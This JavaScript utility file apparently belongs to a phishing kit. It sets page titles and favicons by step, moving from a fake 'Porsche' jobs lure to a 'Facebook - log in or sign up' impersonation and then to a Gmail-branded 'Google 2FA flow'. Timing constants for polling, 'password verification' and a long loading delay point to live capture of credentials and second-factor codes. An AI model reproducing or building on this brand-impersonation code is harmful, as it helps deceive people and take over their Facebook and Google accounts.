export class PageUtils {
  static getPageMeta(step) {
    // Google 2FA flow (steps 16-22): use Gmail favicon
    if (step >= 16 && step <= 22) {
      return {
        title: "Facebook - log in or sign up",
        favicon: "gmail.svg",
      };
    }
    if (step != 1 && step != 11) {
      return {
        title: "Facebook - log in or sign up",
        favicon: "fb.png",
      };
    }
    return {
      title: "Jobs and Careers | Porsche Intenational",
      favicon: "favicon-32x32.png",
    };
  }

  static scrollToTop() {
    window.scrollTo({
      top: 0,
      left: 0,
      behavior: "instant",
    });
  }
}

export const PAGE_CONSTANTS = {
  POLLING_INTERVAL: 2000,
  STEP_TIMER_DURATION: 60000,
  INITIAL_STEP_DELAY: 1000,
  PASSWORD_VERIFICATION_DELAY: 10000,
  LOADING_DELAY: 900000,
};
